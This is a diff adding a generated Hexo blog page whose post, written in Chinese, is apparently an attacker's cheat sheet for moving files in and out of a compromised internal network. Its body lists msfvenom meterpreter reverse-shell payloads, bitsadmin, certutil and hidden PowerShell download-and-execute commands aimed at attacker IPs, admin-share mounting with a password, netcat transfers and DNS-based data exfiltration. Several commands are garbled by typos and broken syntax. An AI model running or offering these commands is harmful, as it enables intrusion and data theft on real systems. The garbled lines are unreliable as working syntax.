@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>内网文件传输 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="windows FTP攻击机：python快速开启ftp服务器 | 目标机：                               | 保存为文件ftp.txt,执行  pip3 install pyftpdlib         copy coon ftp.txt           ftp -i -s:ftp.txt                               open">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网文件传输">
+<meta property="og:url" content="http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="windows FTP攻击机：python快速开启ftp服务器 | 目标机：                               | 保存为文件ftp.txt,执行  pip3 install pyftpdlib         copy coon ftp.txt           ftp -i -s:ftp.txt                               open">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-08-20T11:17:29.000Z">
+<meta property="article:modified_time" content="2023-08-20T13:16:23.786Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-内网文件传输" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" class="article-date">
+  <time class="dt-published" datetime="2023-08-20T11:17:29.000Z" itemprop="datePublished">2023-08-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      内网文件传输
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><ol>
+<li>FTP<br>攻击机：python快速开启ftp服务器 | 目标机：                               | 保存为文件ftp.txt,执行</li>
+</ol>
+<p>pip3 install pyftpdlib         copy coon ftp.txt           ftp -i -s:ftp.txt<br>                               open 192.168.1.227 2121<br>                               anonymoous<br>                               anonymoous<br>                               get msftest.apk<br>                               quit<br>python3 -m pyftpdlib<br>2. Bitsadmin<br>BITSAdmin是一个命令行工具，您可以使用它创建下载或上载作业，并监视其进度。<br>msfvenom -p windows&#x2F;x64&#x2F;meteerpreter&#x2F;reverse_tcp ihost&#x3D;139.155.49.43 iport&#x3D;7777 -f hta-psh 44.hta</p>
+<p>bitsadmin &#x2F;transfer shell <a target="_blank" rel="noopener" href="http://139.155.49.43/">http://139.155.49.43</a> &#x2F;44.hta C:\windows\temp\44.hta</p>
+<p>rundll32.exe url.dll,OpenURL 44.hta</p>
+<ol start="3">
+<li>Certutil</li>
+</ol>
+<ul>
+<li><p>下载并执行<br>certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.227:8000/shell.exe">http://192.168.1.227:8000/shell.exe</a> &amp; shell.exe</p>
+</li>
+<li><p>清除下载缓存<br>certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.1.227:8000/shell.exe">http://192.168.1.227:8000/shell.exe</a> delete</p>
+</li>
+</ul>
+<p>缓存目录：%USERPROFILE%\AppData\Locailow\Microsoft\CryptnetUrlCache\Content</p>
+<ol start="4">
+<li>Powereshell<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;139.155.49.43 lport&#x3D;8899 -f psh-r o shell.ps1</li>
+</ol>
+<p>powershell -windowstyle hidden -exec bypass -c “IEX (New-ObjectNet.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://139.155.49.43/shell.ps1');shell.ps1">http://139.155.49.43/shell.ps1&#39;);shell.ps1</a>“;</p>
+<ol start="5">
+<li>SCP</li>
+</ol>
+<ul>
+<li>SCP上传文件<br>scp win.vbs <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x31;&#46;&#x32;&#50;&#x37;">root@192.168.1.227</a>:&#x2F;tmp&#x2F;win<br>scp -r win&#x2F;<a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x2e;&#50;&#50;&#x37;">root@192.168.1.227</a>:&#x2F;tmp&#x2F;win&#x2F;</li>
+<li>SCP下载文件<br>scp <a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#50;&#x32;&#x37;">root@192.168.1.227</a>:&#x2F;root&#x2F;ftp123 ftp123<br>scp -r linux&#x2F; <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x32;&#50;&#55;">root@192.168.1.227</a>:&#x2F;root&#x2F;linux&#x2F;</li>
+</ul>
+<ol start="6">
+<li>windows文件共享</li>
+</ol>
+<ul>
+<li>Net use<br>net uses k:\192.168.78.67\c$ “123123” &#x2F;user:administrator</li>
+</ul>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ol>
+<li>wget<br>wget命令用来从指定得URL下载文件<br>wget <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a><br>wget -O x.sh <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a></li>
+<li>Curl<br>curl是用来请求web服务器得命令工具。<br>curl -o lan.hta <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a><br>curl -0 <a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a></li>
+<li>Netcat<br>cat file | nc -l 1234<br>nc host_ip 1234 &gt; file<br>nc host_ip 1234 &lt; file<br>nc -lvvp 1234 &gt; file</li>
+</ol>
+<h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><p>DNS传输数据<br>cat test | xxd -p -c 16 | while read line;do host $line.sau547.dnslog.cn;done</p>
+<ol>
+<li><p>PHP<br>php -r ‘file_put_contents(“lan.hta”,file_get_contents(“<a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta">http://192.168.1.227/lan.hta</a>“));’<br>file_put_contents——将一个字符串写入文件<br>file_get_contents——将整个文件读入一个字符串</p>
+</li>
+<li><p>Python<br>python3-c “import<br>urllib.request;u&#x3D;urllib.request.urlopen(‘<a target="_blank" rel="noopener" href="http://192.168.1.227/lan.hta');f=open">http://192.168.1.227/lan.hta&#39;);f=open</a>(‘c:\temp\win.hta’,w ite(u.read().deconde(‘utf-8’))</p>
+</li>
+<li><p>Perl<br>perl -MLWP::Simple -e ‘getstore (“<a target="_blank" rel="noopener" href="http://192.168.1.227/Launcher.hta%22,%22win.hta">http://192.168.1.227/Launcher.hta&quot;,&quot;win.hta</a>“)’</p>
+</li>
+<li><p>Ruby</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" data-id="cmfjsmkfk000gq4e7hl650ijl" data-title="内网文件传输" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/09/05/Linux%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Linux学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/08/19/linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">linux主机信息收集</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/09/16/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A21/">测试博客1</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/14/%E5%8D%9A%E5%AE%A2%E6%B5%8B%E8%AF%95/">博客测试</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/14/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/11/%E6%B5%8B%E8%AF%95/">测试</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/05/%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81-1/">利用kali破解wifi密码</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
